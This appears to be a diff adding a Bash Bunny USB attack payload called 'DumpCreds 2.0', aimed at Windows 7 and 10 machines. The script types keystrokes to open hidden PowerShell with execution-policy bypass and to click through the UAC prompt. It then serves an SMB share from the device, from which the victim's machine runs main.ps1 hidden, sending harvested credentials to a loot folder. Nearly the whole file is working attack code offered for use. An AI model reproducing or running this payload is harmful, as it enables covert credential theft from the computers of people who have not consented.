@@ -1,0 +1,148 @@
+﻿#!/bin/bash
+#
+# Title:         DumpCreds 2.0
+# Author:        QDBA
+# Version:       2.0.2
+# Build: 		 1001
+# Category:      Exfiltration
+# Target:        Windows Windows 7 + 10 (Powershell)
+# Attackmodes:   HID, Ethernet
+# 
+# 
+# White................Wait for driver installation
+# Red Blink Fast.......Impacket not found
+# Red Blink Slow.......Target did not acquire IP address
+# Amber Blink Fast.....Initialization
+# Amber................HID Stage
+# Purple Blink Fast....Wait for IP coming up
+# Purple Blink Slow....Wait for Handshake (SMB Server Coming up)
+# Purple / Amber ......Powershell scripts running  
+# RED..................Error in Powershell scripts
+# Green................Finished
+#
+# OPTIONS
+
+# Source bunny_helpers.sh to get environment variables
+source bunny_helpers.sh
+
+# Some Variables
+SWITCHDIR=/root/udisk/payloads/$SWITCH_POSITION
+LOOTDIR=$SWITCHDIR/loot
+mkdir -p $LOOTDIR >/dev/null
+
+
+# Initialization
+LED R G 100
+
+
+# Check for impacket. If not found, blink fast red.
+if [ ! -f pentest/impacket/examples/smbserver.py ]; then
+  LED R 100
+  exit 1
+fi
+
+# remove old Handshake Files
+rm -f $SWITCHDIR/CON_*
+
+
+# HID STAGE
+# Runs minimized powershell waiting for Bash Bunny to appear as 172.16.64.1.
+LED R G B
+ATTACKMODE HID
+
+Q SET_LANGUAGE DE
+
+# Give some time for driver installation
+Q DELAY 25000
+
+LED R G 100
+# Launch initial cmd
+Q GUI r
+Q DELAY 1000
+Q STRING cmd /k mode con lines=1 cols=180
+Q DELAY 500
+Q ENTER
+
+
+# Launch powershell as admin and deletes Run history
+#Q GUI r
+Q DELAY 1000
+#Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass -c "Start-Process cmd -A '/t:fe /k mode con lines=1 cols=180' -Verb runAs"
+Q STRING start powershell -NoP -NonI -W Hidden -Exec Bypass -c "Start-Process cmd -A '/k mode con lines=1 cols=180' -Verb runAs"
+Q DELAY 500
+Q ENTER
+
+# Bypass UAC :: Change "ALT j" according to your language i.e. for us it is ALT o
+# Bypass UAC :: Change "ALT j" according to your language i.e. for us it is ALT o
+
+# With Admin rights the UAC prompt opens. ALT j goes to the prompt and the admin CMD windows opens. The ALT n goes to this Window (doesn't matter) than Enter for Newline
+# now the second powershell command goes to the admin cmd windows. 
+
+# With no Adminrights the the credentils prompt opens. ALT j doesn't do anything because there are no credentials. Then ALT n cancels the credentials propmpt. 
+# the second powershell command goes to the cmd Windows I open first. 
+Q DELAY 1000
+Q ALT j
+Q DELAY 500
+Q ENTER
+
+Q DELAY 1000
+Q ALT n
+Q DELAY 500
+Q ENTER
+
+LED R G
+# Wait for Bunny Ethernet and Start main.ps1 Powershell Script
+Q DELAY 500
+Q STRING "powershell \"while (1) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { sleep 2; powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \\\172.16.64.1\e\main.ps1; exit } }\""
+Q DELAY 1000
+Q ENTER
+
+
+
+# Ethernet Tage
+LED R B 1
+ATTACKMODE RNDIS_ETHERNET
+# Source bunny_helpers.sh to get environment variables
+source bunny_helpers.sh
+
+
+# Start SMB Server
+/pentest/impacket/examples/smbserver.py e $SWITCHDIR &
+
+# Give target a chance to start exfiltration
+sleep 2
+
+# Here you can do anything else except but do not change the ATTACKMODE or umount /root/udisk
+
+
+
+# Check target IP address. If unset, blink slow red.
+if [ -z "${TARGET_IP}" ]; then
+    LED R 1000
+	exit 1
+fi
+
+LED R B 1000
+# Handshake Bunny and Computer
+while ! [ -f $SWITCHDIR/CON_REQ ]; do
+	sleep 1
+done
+mv $SWITCHDIR/CON_REQ $SWITCHDIR/CON_OK
+LED R B
+
+# Wait until CON_EOF - Computer set it if all is ready
+while ! [ -f $SWITCHDIR/CON_EOF ]; do
+	LED R B
+	sleep 1
+	LED R G
+	sleep 1
+	if [ -f $SWITCHDIR/CON_ERR ]; then
+		rm $SWITCHDIR/CON_ERR
+		LED R
+		exit 2
+	fi
+done
+rm $SWITCHDIR/CON_EOF
+sync; sleep 1; sync
+
+LED G
